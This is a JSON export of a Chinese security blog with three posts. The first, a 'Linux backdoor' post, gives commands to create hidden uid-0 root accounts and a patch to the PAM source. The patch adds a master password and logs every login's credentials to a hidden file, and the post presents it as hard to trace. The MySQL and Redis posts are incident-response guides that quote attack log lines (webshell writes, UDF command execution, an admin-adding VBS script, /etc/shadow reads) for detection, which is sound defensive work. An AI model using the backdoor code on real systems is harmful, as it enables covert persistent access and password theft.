{"meta":{"title":"T1sts-blogs","subtitle":"","description":"T1sts 随笔记录","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2024-06-28T09:18:13.358Z","updated":"2024-06-28T09:18:13.358Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"所有分类","date":"2024-04-28T11:48:05.678Z","updated":"2024-04-28T11:48:05.678Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2024-06-28T09:17:37.919Z","updated":"2024-06-28T09:17:37.919Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"知人者智，自知者明；胜人者有力，自胜者强。"},{"title":"友链","date":"2024-06-28T09:23:39.120Z","updated":"2024-06-28T09:23:39.120Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""},{"title":"","date":"2024-06-28T09:44:47.198Z","updated":"2024-06-28T09:44:41.732Z","comments":true,"path":"faqs/index.html","permalink":"http://example.com/faqs/index.html","excerpt":"","text":""},{"title":"","date":"2024-06-28T10:06:48.194Z","updated":"2024-06-28T10:06:48.194Z","comments":true,"path":"certificate/index.html","permalink":"http://example.com/certificate/index.html","excerpt":"","text":"某方某通"},{"title":"所有标签","date":"2024-04-28T11:56:01.334Z","updated":"2024-04-28T11:56:01.334Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Linux backdoor","slug":"Linux-backdoor","date":"2024-05-31T05:48:17.000Z","updated":"2024-05-31T07:38:02.105Z","comments":true,"path":"2024/05/31/Linux-backdoor/","permalink":"http://example.com/2024/05/31/Linux-backdoor/","excerpt":"","text":"Add user添加普通用户 1234567891011# 创建用户名为t1sts，密码为t1stsyyds的普通用户useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; t1stsyyds` t1sts# 同普通用户useradd -p &quot;$(openssl passwd -1 t1stsyyds)&quot; t1sts# chpasswd方法useradd t1sts;echo &#x27;t1sts:t1stsyyds&#x27;|chpasswd# echo -e 方法useradd t1sts;echo -e &quot;t1stsyyds\\nt1stsyyds\\n&quot; |passwd t1sts 添加 root 权限用户 12# 创建一个用户名t1sts，密码t1stsyyds的root用户useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; t1stsyyds` t1sts -o -u 0 -g root -G root -s /bin/bash -d /home/t1sts PAM 条件：Centos系统 结果：对原服务器无影响，溯源难度大 PAM 是 Linux 默认的 SSH 认证登录机制。通过修改 PAM 源码，可以实现万能密码和记录登录密码等功能。在 CentOS 中，需要关闭 SELinux 才能进行这些操作。云主机（如腾讯云和阿里云）默认关闭 SELinux。在实际应用中，由于业务需求，有时也会关闭 SELinux。SELinux 有三种状态： Enforcing：SELinux 正在强制执行安全策略。 Permissive：SELinux 处于宽容模式，只记录安全策略的违规情况，不会阻止操作。 Disabled：SELinux 被禁用。 123find / -name &quot;pam_unix.so&quot;getenforce 如果 SELinux 处于开启状态，可以选择其他后门方法，因为通过编辑配置文件将 SELINUX 修改为 disabled 后需要重启系统才能生效。 123vim /etc/selinux/configSELINUX=disabled 操作定位 PAM 版本，根据 PAM 版本来制作不同的登录凭据 12[root@VM-8-10-centos ~]# rpm -qa|grep pampam-1.1.8-23.el7.x86_64 下载相同版本的 PAM 打开 linux-pam-Linux-PAM-1_1_8\\modules\\pam_unix\\pam_unix_auth.c 在其中搜索 PAM_SUCCESS 定位到如下代码块，并在标记的两段代码之间添加如下内容 123456789101112if(strcmp(&quot;t1stsyyds&quot;,p)==0) &#123; retval = PAM_SUCCESS; &#125;if(retval== PAM_SUCCESS)&#123; FILE *fp; fp = fopen(&quot;/tmp/.hack&quot;,&quot;a+&quot;); fprintf(fp,&quot;%s::%s\\n&quot;,name,p); fclose(fp);&#125; 最终添加完的代码块如下所示 无法编译失败","categories":[{"name":"permission maintenance","slug":"permission-maintenance","permalink":"http://example.com/categories/permission-maintenance/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"Mysql服务排查","slug":"Mysql服务排查","date":"2024-05-08T11:19:58.000Z","updated":"2024-05-31T05:59:16.060Z","comments":true,"path":"2024/05/08/Mysql服务排查/","permalink":"http://example.com/2024/05/08/Mysql%E6%9C%8D%E5%8A%A1%E6%8E%92%E6%9F%A5/","excerpt":"","text":"实验环境为 Linux x64 + MySQL 5.2.23 实验环境为 Linux x64 + MySQL 5.2.23Webshell排查into outfile 排查通过使用 into outfile 来模拟 SQL 注入并写入 Webshell 12mysql&gt; SELECT &#x27;webshell_test&#x27; INTO OUTFILE &#x27;/var/www/html/test1.php&#x27;;Query OK, 1 row affected (0.00 sec) 在执行以上 SQL 查询后，日志中明显出现了恶意文件的路径和内容，我们可以直接删除这个 WebShell 文件 12mysql&gt; \\! cat /var/lib/mysql/14ab6e4fe4be.log240508 8:15:21 6 Query SELECT &#x27;webshell_test&#x27; INTO OUTFILE &#x27;/var/www/html/test1.php&#x27; 通过日志写入 WebShell 排查在排查时，如果发现日志路径被篡改，可判断由日志写入的 Webshell 1234567mysql&gt; show VARIABLES LIKE &quot;general_log%&quot;;+------------------+----------------------------+| Variable_name | Value |+------------------+----------------------------+| general_log | ON || general_log_file | /var/www/html/shell.php |+------------------+----------------------------+ 删除恶意文件&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php，同时将数据库日志路径恢复原状 1234567891011121314151617181920212223root@14ab6e4fe4be:/# ls -al /var/lib/mysql/total 28700drwx------ 5 mysql mysql 4096 May 8 07:52 .drwxr-xr-x 1 root root 4096 Feb 15 2016 ..-rw-rw---- 1 mysql mysql 393 May 8 07:52 14ab6e4fe4be.log-rw-rw---- 1 mysql mysql 5242880 May 8 03:13 ib_logfile0-rw-rw---- 1 mysql mysql 5242880 May 8 03:13 ib_logfile1-rw-rw---- 1 mysql mysql 18874368 May 8 03:13 ibdata1drwx------ 2 mysql root 4096 May 8 03:13 mysqldrwx------ 2 mysql mysql 4096 May 8 03:13 performance_schemadrwx------ 2 mysql mysql 4096 May 8 03:23 testdbmysql&gt; SET GLOBAL general_log_file=&#x27;/var/lib/mysql/14ab6e4fe4be.log&#x27;;Query OK, 0 rows affected (0.00 sec)mysql&gt; show VARIABLES LIKE &quot;general_log%&quot;;+------------------+----------------------------------------+| Variable_name | Value |+------------------+----------------------------------------+| general_log | ON || general_log_file | /usr/local/mysql/data/9956ee9aa191.log |+------------------+----------------------------------------+2 rows in set (0.00 sec) UDF提权排查查看 MySQL 版本，判断 UDF 提权文件的导出路径 123select version();// 5.5.23 在 MySQL 版本高于或等于5.1的情况下，请检查plugin目录，可能存在恶意的.so文件 123show variables like &#x27;%plugin%&#x27;;// 路径为：/usr/local/mysql/lib/plugin/ 检查日志是否开启，默认为关闭状态 12345678mysql&gt; show VARIABLES LIKE &quot;general_log%&quot;;+------------------+----------------------------------------+| Variable_name | Value |+------------------+----------------------------------------+| general_log | ON || general_log_file | /usr/local/mysql/data/9956ee9aa191.log |+------------------+----------------------------------------+ 日志开启情况下排查若日志文件启用，可以检索其中的记录，查看是否存在 create function 的记录。若存在,则可发现创建的恶意函数名，在此处是 sys_eval 12root@9956ee9aa191:/# cat /usr/local/mysql/data/9956ee9aa191.log | grep &quot;create function&quot; 7 Query create function sys_eval returns string soname &#x27;udf.so&#x27; 跟踪恶意函数，检查其执行的敏感操作。通常，管理员不会创建一个用于执行命令的函数并查看自身权限，因此可以基本确认这是攻击者的行为 123root@9956ee9aa191:/# cat /usr/local/mysql/data/9956ee9aa191.log | grep &quot;sys_eval&quot; 7 Query create function sys_eval returns string soname &#x27;udf.so&#x27; 7 Query select sys_eval(&quot;id&quot;) 日志未开启情况下排查直接检查 plugin 目录是否存在异常文件，可以根据文件的创建时间来进行判断。发现最新创建的文件是udf.so，应将异常文件上传至安全威胁平台进行分析或反编译 12345678910111213141516171819202122root@9956ee9aa191:/# ls -al /usr/local/mysql/lib/plugin/total 1512drwxr-xr-x 1 mysql mysql 4096 May 7 09:38 .drwxr-xr-x 1 mysql mysql 4096 Mar 23 2018 ..-rw-r--r-- 1 mysql mysql 13920 Mar 23 2018 adt_null.so-rw-r--r-- 1 mysql mysql 29992 Mar 23 2018 auth.so-rw-r--r-- 1 mysql mysql 14456 Mar 23 2018 auth_socket.so-rw-r--r-- 1 mysql mysql 27976 Mar 23 2018 auth_test_plugin.so-rw-r--r-- 1 mysql mysql 227 Mar 29 2012 daemon_example.inidrwxr-xr-x 1 mysql mysql 4096 Mar 23 2018 debug-rw-r--r-- 1 mysql mysql 271184 Mar 23 2018 ha_archive.so-rw-r--r-- 1 mysql mysql 219064 Mar 23 2018 ha_blackhole.so-rw-r--r-- 1 mysql mysql 175272 Mar 23 2018 ha_example.so-rw-r--r-- 1 mysql mysql 340712 Mar 23 2018 ha_federated.so-rw-r--r-- 1 mysql mysql 36440 Mar 23 2018 libdaemon_example.so-rw-r--r-- 1 mysql mysql 20816 Mar 23 2018 mypluglib.so-rw-r--r-- 1 mysql mysql 19512 Mar 23 2018 qa_auth_client.so-rw-r--r-- 1 mysql mysql 30568 Mar 23 2018 qa_auth_interface.so-rw-r--r-- 1 mysql mysql 15600 Mar 23 2018 qa_auth_server.so-rw-r--r-- 1 mysql mysql 182336 Mar 23 2018 semisync_master.so-rw-r--r-- 1 mysql mysql 91000 Mar 23 2018 semisync_slave.so-rw-rw-rw- 1 mysql mysql 8040 May 7 09:38 udf.so 在 MySQL 数据库中的 func 表中存在恶意函数记录 1234567select * from mysql.func+-----------+---------+---------------+-----+| name | dl | type | ret |+-----------+---------+---------------+-----+| sys_eval | udf.so | function | 0 |+-----------+---------+---------------+-----+ 应急操作 将恶意的 .so 文件备份至本地，并删除 plugin 目录下的恶意文件 删除恶意函数：DROP FUNCTION sys_eval; 将备份的恶意文件上传至威胁情报平台进行分析或者反编译 CVE-2012-2122通过查看日志文件发现短时间内存在大量的登陆记录，类似于爆破密码的过程，但与爆破密码不同的是中间会存在多条登录成功的日志记录 123456789662 Connect root@localhost on 662 Connect Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: YES) 663 Connect root@localhost on 663 Query select @@version_comment limit 1240508 1:58:37 663 Quit 664 Connect root@localhost on 664 Connect Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: YES) 665 Connect root@localhost on 665 Connect Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: YES) 若使用 MSF 进行攻击，只有150行左右的日志记录，登录成功后的会导出 MySQL 所有用户的哈希值，可以在日志中看到如下语句 12345142 Connect root@172.18.0.1 on 142 Connect Access denied for user &#x27;root&#x27;@&#x27;172.18.0.1&#x27; (using password: YES) 145 Connect root@172.18.0.1 on 145 Connect Access denied for user &#x27;root&#x27;@&#x27;172.18.0.1&#x27; (using password: YES) 136 Query SELECT user,password from mysql.user CVE-2016-6663 &amp; CVE-2016-6664这两个漏洞一般用作组合拳，CVE-2016-6663 用于从 webshell 拿到 www-data 权限后提权至 MySQL 用户，再使用 CVE-2016-6664 将 MySQL提权至 Root权限。 利用版本：MySQL&lt;5.5.51 或 MySQL&lt;5.6.32 或 MySQL&lt;5.7.14 CVE-2016-6663CVE-2016-6663 涉及一个需要具备创建、删除、插入和查询权限的数据库账号。使用该账号进行攻击会在数据库中留下被攻击后的表格，但这些表格无法打开，提示已损坏，且无法修复 123456789101112131415161718192021222324mysql&gt; SHOW DATABASES;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || testdb |+--------------------+4 rows in set (0.00 sec)mysql&gt; use testdb;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; SHOW TABLES;+------------------+| Tables_in_testdb |+------------------+| exploit_table || mysql_suid_shell |+------------------+2 rows in set (0.00 sec) 以下是截取部分日志代表性信息： 12345240508 3:53:37 9 Query CREATE TABLE exploit_table (txt varchar(50)) engine = &#x27;MyISAM&#x27; data directory &#x27;/tmp/mysql_privesc_exploit&#x27;240508 3:53:38 9 Query REPAIR TABLE exploit_table EXTENDED240508 3:59:41 9 Quit240508 4:00:47 10 Connect test@localhost on testdb240508 4:00:49 10 Query DROP TABLE IF EXISTS exploit_table 特征点： 日志中频繁出现了对 exploit_table 表的创建和删除操作，并显示了使用了 MyISAM 存储引擎 恶意数据文件存放在目录：&#x2F;tmp&#x2F;mysql_privesc_exploit 排查与响应： 排查网站目录下的 Webshell，判断攻击者是通过 www-data 进行提权至 MySQL 权限，还是通过 MySQL 权限提升至 ROOT 权限 排查 MySQL 数据库是否泄露用户名和密码导致被攻击者利用，例如 Web 站点被拿下，攻击者读取配置文件发现 MySQL 账号密码 删除已经创建的恶意数据表，并清理&#x2F;tmp目录下的 mysql_privesc_exploit 目录及其内容 CVE-2016-6664漏洞是利用了 MySQL 的自启动权限来进行提权的。攻击者通过将error.log文件软链接至恶意文件，当 MySQL 自启动时，权限被授予给了error.log文件，实际上也就是授予了恶意文件 该漏洞需要获取到 MySQL 权限后才能提权至 ROOT 权限。其可能更改的配置文件为： &#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;mysqld_safe_syslog.cnf可能会被更改，攻击者会将删除syslog 1234// 初始mysqld_safe_syslog.cnf文件内容root@14ab6e4fe4be:/tmp# cat /etc/mysql/conf.d/mysqld_safe_syslog.cnf[mysqld_safe]syslog tmp 下会出现提权共享库privesclib.c和privesclib.so文件 1rm -rf privesclib.c privesclib.so tmp 下会存在低权限后门mysqlrootsh 1rm -rf mysqlrootsh 创建恶意的连接符（软链接），将恶意内容写入至ld.so.preload 12345678// 恶意连接符 /var/log/mysql/error.log -&gt; /etc/ld.so.preload // 查看特定目录下的所有连接符 ls -l /path/to/directory/* // 删除连接符，如下命令不会删除目标文件或目录 rm /var/log/mysql/error.log 后门用户排查查看是否存在攻击者创建的恶意账户 12345678910111213// 查看MySQL中所有用户mysql&gt; SELECT User, Host FROM mysql.user;+-------+--------------+| User | Host |+-------+--------------+| admin | % || test | % || root | 127.0.0.1 || root | 14ab6e4fe4be || root | ::1 || root | localhost |+-------+--------------+6 rows in set (0.00 sec) 排查用户的权限时，需要注意权限分配情况，尤其要关注是否存在滥用权限的账号。只有拥有 CREATE USER 权限的账号才能创建用户 12345678910111213// 排查创建用户的权限mysql&gt; SELECT User, Host, Create_user_priv FROM mysql.user; +-------+--------------+------------------+ | User | Host | Create_user_priv | +-------+--------------+------------------+ | root | localhost | Y | | root | 14ab6e4fe4be | Y | | root | 127.0.0.1 | Y | | root | ::1 | Y | | admin | % | Y | | test | % | N | +-------+--------------+------------------+ 6 rows in set (0.00 sec) 排查拥有 EXECUTE 权限的用户，因为只有拥有该权限的用户才能调用存储过程 123456789101112mysql&gt; SELECT User, Host, Execute_priv FROM mysql.user;+-------+--------------+--------------+| User | Host | Execute_priv |+-------+--------------+--------------+| root | localhost | Y || root | 14ab6e4fe4be | Y || root | 127.0.0.1 | Y || root | ::1 | Y || admin | % | Y || test | % | N |+-------+--------------+--------------+6 rows in set (0.00 sec) MySQL启动项提权排查该技巧只能在 Windows 中使用，且需要服务器重启 排查方法： 排查 Windows 开始菜单栏中是否有恶意的 VBS 提权脚本 MySQL 日志中会存在如下的恶意 SQL 语句 123452024-05-08T08:28:39.234957Z 13 Query create table secist(cmd text)2024-05-08T08:28:46.097512Z 13 Query insert into secist values(&quot;set wshshell=createobject(&quot;&quot;wscript.shell&quot;&quot;)&quot;)2024-05-08T08:28:55.592555Z 13 Query insert into secist values(&quot;a=wshshell.run(&quot;&quot;cmd.exe /c net user secist secist.com /add&quot;&quot;,0)&quot;)2024-05-08T08:29:01.858967Z 13 Query insert into secist values(&quot;b=wshshell.run(&quot;&quot;cmd.exe /c net localgroup administrators secist /add&quot;&quot;,0)&quot;)2024-05-08T08:29:36.139032Z 13 Query select * from secist into dumpfile &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\1.vbs&quot; 存储过程利用排查拥有 EXECUTE****权限才可以调用存储过程 通过日志排查排查日志，可通过排查 procedure 关键字发现其创建的存储过程，在此处为 readf 12root@14ab6e4fe4be:/# cat /var/lib/mysql/14ab6e4fe4be.log | grep &quot;procedure&quot;240508 10:20:11 1 Query create procedure readf(f varchar (100)) 通过追踪存储过程的名称，来查看其执行的操作，可以发现其查看了敏感文件 1234root@14ab6e4fe4be:/# cat /var/lib/mysql/14ab6e4fe4be.log | grep &quot;readf&quot;240508 10:20:11 1 Query create procedure readf(f varchar (100))240508 10:21:59 4 Query call testdb.readf(&#x27;/etc/passwd&#x27;)240508 10:22:15 4 Query call testdb.readf(&#x27;/etc/shadow&#x27;) 通过数据库排查查询已有存储过程 1234567mysql&gt; SHOW PROCEDURE STATUS;+--------+-------+-----------+----------------+---------------------+---------------------+---------------+---------+----------------------+----------------------+--------------------+| Db | Name | Type | Definer | Modified | Created | Security_type | Comment | character_set_client | collation_connection | Database Collation |+--------+-------+-----------+----------------+---------------------+---------------------+---------------+---------+----------------------+----------------------+--------------------+| testdb | readf | PROCEDURE | root@localhost | 2024-05-08 09:47:42 | 2024-05-08 09:47:42 | DEFINER | | latin1 | latin1_swedish_ci | latin1_swedish_ci | +--------+-------+-----------+----------------+---------------------+---------------------+---------------+---------+----------------------+----------------------+--------------------+ 1 row in set (0.00 sec) 查询已有存储过程的详细信息 123456789101112131415161718mysql&gt; SHOW CREATE PROCEDURE testdb.readf; +-----------+----------+-------------------------------------------------------------------------------------------------------+----------------------+----------------------+--------------------+ | Procedure | sql_mode | Create Procedure | character_set_client | collation_connection | Database Collation | +-----------+----------+-------------------------------------------------------------------------------------------------------+----------------------+----------------------+--------------------+ | readf | | CREATE DEFINER=`root`@`localhost` PROCEDURE `readf`(f varchar (100)) begin select load_file(f); end | latin1 | latin1_swedish_ci | latin1_swedish_ci | +-----------+----------+-------------------------------------------------------------------------------------------------------+----------------------+----------------------+--------------------+ 1 row in set (0.00 sec) // 上述的实际内容为：CREATE DEFINER=`root`@`localhost` PROCEDURE `readf`(f VARCHAR(100))BEGIN SELECT LOAD_FILE(f);END 应急操作12// 将存储过程删除DROP PROCEDURE IF EXISTS testdb.readf; 小技巧判断攻击者是否登录成功登陆成功的日志文件 12240507 10:46:22 17 Connect root@localhost on 17 Query select @@version_comment limit 1 登录失败的日志文件 12240507 10:41:37 14 Connect root@192.168.96.1 on 14 Connect Access denied for user &#x27;root&#x27;@&#x27;192.168.96.1&#x27; (using password: YES) 登录失败会有很明显的提示，而登录成功则执行后续的操作 判断攻击者登录方式Navicat 执行恶意操作的日志： 12345root@9956ee9aa191:/# cat /usr/local/mysql/data/9956ee9aa191.log | grep &quot;sys_eval&quot; 7 Query create function sys_eval returns string soname &#x27;udf.so&#x27; 7 Query select sys_eval(&quot;id&quot;) 8 Query select sys_eval(&quot;id&quot;) 8 Query select sys_eval(&quot;id&quot;) 命令行执行恶意操作的日志： 1234567root@9956ee9aa191:/# cat /usr/local/mysql/data/9956ee9aa191.log | grep &quot;sys_eval&quot; 9 Query create function sys_eval returns string soname &#x27;udf.so&#x27; 9 Query select sys_eval(&quot;whoami&quot;)240507 9:38:50 11 Query select sys_eval(&quot;id&quot;)240507 9:38:52 11 Query select sys_eval(&quot;id&quot;) 11 Query select sys_eval(&quot;id&quot;)240507 9:38:53 11 Query select sys_eval(&quot;id&quot;) MDUT执行恶意操作的日志 1234567891011root@9956ee9aa191:/# cat /usr/local/mysql/data/9956ee9aa191.log | grep &quot;sys_eval&quot;240507 10:13:47 8 Query drop function if exists sys_eval 8 Query create function sys_eval returns string soname &#x27;3fe6a354251823f6.temp&#x27;240507 10:13:51 8 Query select sys_eval(&#x27;id&#x27;) as s240507 10:13:57 8 Query select sys_eval(&#x27;id&#x27;) as s 8 Query select sys_eval(&#x27;id&#x27;) as s 8 Query select sys_eval(&#x27;id&#x27;) as s 8 Query select sys_eval(&#x27;id&#x27;) as s 8 Query select sys_eval(&#x27;id&#x27;) as s240507 10:13:58 8 Query select sys_eval(&#x27;id&#x27;) as s 8 Query select sys_eval(&#x27;id&#x27;) as s 查看当前连接数据库的活跃用户123456789101112mysql&gt; SHOW PROCESSLIST;+----+------+--------------------+------+---------+-------+-------+------------------+| Id | User | Host | db | Command | Time | State | Info |+----+------+--------------------+------+---------+-------+-------+------------------+| 5 | root | 192.168.96.1:4814 | NULL | Sleep | 66100 | | NULL || 6 | root | 192.168.96.1:22537 | NULL | Sleep | 66128 | | NULL || 7 | root | 192.168.96.1:56755 | NULL | Sleep | 2 | | NULL || 9 | root | 172.18.0.1:41538 | NULL | Sleep | 294 | | NULL || 10 | root | 192.168.96.1:37797 | NULL | Sleep | 2 | | NULL || 12 | root | localhost | NULL | Query | 0 | NULL | SHOW PROCESSLIST |+----+------+--------------------+------+---------+-------+-------+------------------+6 rows in set (0.00 sec)","categories":[{"name":"Emergency response","slug":"Emergency-response","permalink":"http://example.com/categories/Emergency-response/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"http://example.com/tags/Mysql/"}]},{"title":"Redis服务排查","slug":"Redis服务排查","date":"2024-05-07T12:06:26.000Z","updated":"2024-05-07T12:11:10.688Z","comments":true,"path":"2024/05/07/Redis服务排查/","permalink":"http://example.com/2024/05/07/Redis%E6%9C%8D%E5%8A%A1%E6%8E%92%E6%9F%A5/","excerpt":"","text":"主从复制攻击排查 实验环境为 CentOS7 + Redis 5.0.13 通过日志排查通过Dcoker日志排查12345678910111213141516171819202122232425262728293031┌──(root㉿kali)-[/]└─# docker logs loving_elbakyan1:C 06 May 2024 08:46:32.955 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo1:C 06 May 2024 08:46:32.955 # Redis version=5.0.14, bits=64, commit=00000000, modified=0, pid=1, just started1:C 06 May 2024 08:46:32.955 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf1:M 06 May 2024 08:46:32.956 * Running mode=standalone, port=6379.1:M 06 May 2024 08:46:32.956 # Server initialized1:M 06 May 2024 08:46:32.956 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add &#x27;vm.overcommit_memory = 1&#x27; to /etc/sysctl.conf and then reboot or run the command &#x27;sysctl vm.overcommit_memory=1&#x27; for this to take effect.1:M 06 May 2024 08:46:32.956 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command &#x27;echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled&#x27; as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.1:M 06 May 2024 08:46:32.956 * Ready to accept connections---------------------------------------------分割线----------------------------------------1:S 06 May 2024 10:29:28.169 * Before turning into a replica, using my master parameters to synthesize a cached master: I may be able to synchronize with the new master with just a partial transfer.1:S 06 May 2024 10:29:28.169 * REPLICAOF 192.168.96.1:1234 enabled (user request from &#x27;id=9 addr=172.17.0.1:55592 fd=9 name= age=31 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=46 qbuf-free=32722 obl=0 oll=0 omem=0 events=r cmd=slaveof&#x27;)1:S 06 May 2024 10:29:28.842 * Connecting to MASTER 192.168.96.1:12341:S 06 May 2024 10:29:28.843 * MASTER &lt;-&gt; REPLICA sync started1:S 06 May 2024 10:29:28.843 * Non blocking connect for SYNC fired the event.1:S 06 May 2024 10:29:33.844 * Master replied to PING, replication can continue...1:S 06 May 2024 10:29:33.844 * Trying a partial resynchronization (request a01036a935e2c26997e33cebae0ff5436a243f71:1).1:S 06 May 2024 10:29:33.845 * Full resync from master: ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ:11:S 06 May 2024 10:29:33.845 * Discarding previously cached master state.1:S 06 May 2024 10:29:33.845 * MASTER &lt;-&gt; REPLICA sync: receiving 44320 bytes from master1:S 06 May 2024 10:29:33.846 * MASTER &lt;-&gt; REPLICA sync: Flushing old data1:S 06 May 2024 10:29:33.846 * MASTER &lt;-&gt; REPLICA sync: Loading DB in memory1:S 06 May 2024 10:29:33.846 # Wrong signature trying to load DB from file1:S 06 May 2024 10:29:33.846 # Failed trying to load the MASTER synchronization DB from disk1:S 06 May 2024 10:29:33.870 * Connecting to MASTER 192.168.96.1:12341:S 06 May 2024 10:29:33.870 * MASTER &lt;-&gt; REPLICA sync started1:S 06 May 2024 10:29:34.008 * Module &#x27;system&#x27; loaded from ./exp.so1:M 06 May 2024 10:29:42.108 # Setting secondary replication ID to a01036a935e2c26997e33cebae0ff5436a243f71, valid up to offset: 1. New replication ID is 3d5f7b8b3e1222704460fcdf01715e126e5fd9521:M 06 May 2024 10:29:42.108 * MASTER MODE enabled (user request from &#x27;id=9 addr=172.17.0.1:55592 fd=9 name= age=45 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=34 qbuf-free=32734 obl=0 oll=0 omem=0 events=r cmd=slaveof&#x27;) 从中可以查看到攻击时间、攻击者IP、恶意文件名恶意扩展模块名称等 通过Redis日志排查12345678910111213141516171819202122232425262728293031[root@VM-8-10-centos ~]# cat /etc/redis.conf | grep logfilelogfile /var/log/redis/redis.log[root@VM-8-10-centos ~]# cat /var/log/redis/redis.log2408:M 07 May 2024 10:55:03.778 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.2408:M 07 May 2024 10:55:03.778 # Server initialized2408:M 07 May 2024 10:55:03.778 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add &#x27;vm.overcommit_memory = 1&#x27; to /etc/sysctl.conf and then reboot or run the command &#x27;sysctl vm.overcommit_memory=1&#x27; for this to take effect.2408:M 07 May 2024 10:55:03.778 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command &#x27;echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled&#x27; as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.2408:M 07 May 2024 10:55:03.778 * Ready to accept connections2408:S 07 May 2024 10:57:14.147 * Before turning into a replica, using my master parameters to synthesize a cached master: I may be able to synchronize with the new master with just a partial transfer.2408:S 07 May 2024 10:57:14.147 * REPLICAOF xxx.xxx.xxx.xxx:56789 enabled (user request from &#x27;id=3 addr=127.0.0.1:47674 fd=9 name= age=108 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=49 qbuf-free=32719 obl=0 oll=0 omem=0 events=r cmd=slaveof&#x27;)2408:S 07 May 2024 10:57:15.106 * Connecting to MASTER xxx.xxx.xxx.xxx:567892408:S 07 May 2024 10:57:15.106 * MASTER &lt;-&gt; REPLICA sync started2408:S 07 May 2024 10:57:15.107 * Non blocking connect for SYNC fired the event.2408:S 07 May 2024 10:57:19.187 # Module ./exp.so failed to load: ./exp.so: cannot open shared object file: No such file or directory2408:S 07 May 2024 10:57:20.111 * Master replied to PING, replication can continue...2408:S 07 May 2024 10:57:20.112 * Trying a partial resynchronization (request b3b4fdc7843bfafe15347a957dae622d391b9b95:1).2408:S 07 May 2024 10:57:20.113 * Full resync from master: ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ:12408:S 07 May 2024 10:57:20.113 * Discarding previously cached master state.2408:S 07 May 2024 10:57:20.113 * MASTER &lt;-&gt; REPLICA sync: receiving 44320 bytes from master2408:S 07 May 2024 10:57:20.119 * MASTER &lt;-&gt; REPLICA sync: Flushing old data2408:S 07 May 2024 10:57:20.119 * MASTER &lt;-&gt; REPLICA sync: Loading DB in memory2408:S 07 May 2024 10:57:20.119 # Wrong signature trying to load DB from file2408:S 07 May 2024 10:57:20.119 # Failed trying to load the MASTER synchronization DB from disk2408:S 07 May 2024 10:57:20.120 * Connecting to MASTER xxx.xxx.xxx.xxx:567892408:S 07 May 2024 10:57:20.121 * MASTER &lt;-&gt; REPLICA sync started2408:S 07 May 2024 10:57:20.121 * Non blocking connect for SYNC fired the event.2408:S 07 May 2024 10:57:20.193 # Error condition on socket for SYNC: Connection reset by peer2408:S 07 May 2024 10:57:21.123 * Connecting to MASTER xxx.xxx.xxx.xxx:567892408:S 07 May 2024 10:57:21.123 * MASTER &lt;-&gt; REPLICA sync started2408:S 07 May 2024 10:57:21.124 # Error condition on socket for SYNC: Connection refused2408:S 07 May 2024 10:57:22.125 * Connecting to MASTER xxx.xxx.xxx.xxx:56789 从中可以查看到攻击时间、攻击者IP、恶意文件名恶意扩展模块名称等 通过命令行排查连接Redis命令行，关注 INFO 下的如下字段，在默认情况下和遭受攻击的情况下会有所改变 role：Redis 实例的角色，如果是主服务器，其值为 master，如果是从服务器，其值为 slave connected_slaves：当前连接到主服务器的从服务器的数量。如果这个值大于 0，则表示设置了主从复制 master_host：主服务器IP地址，设置了主从复制时才会出现该字段 master_port：主服务器端口，设置了主从复制时才会出现该字段 12345678910// 正常情况下的INFO字段信息role:masterconnected_slaves:0// 遭受攻击时的INFO字段信息role:slavemaster_host:攻击者IPmaster_port:攻击者端口connected_slaves:0 通常情况下很难在告警的第一时间就连接至Redis进行命令排查，而当攻击者执行完下述命令后上面提到的内容就恢复正常了 123// 取消其作为从服务器的角色，使其成为主服务器127.0.0.1:6379&gt; slaveof no oneOK 此时可以通过如下命令查看配置文件来查看恶意文件名称和恶意文件目录 12345678910111213// 默认情况下的配置文件127.0.0.1:6379&gt; CONFIG GET * 1) &quot;dbfilename&quot; 2) &quot;dump.rdb&quot;201) &quot;dir&quot;202) &quot;/root&quot;// 遭受攻击后的配置文件127.0.0.1:6379&gt; CONFIG GET * 1) &quot;dbfilename&quot; 2) &quot;exp.so&quot;201) 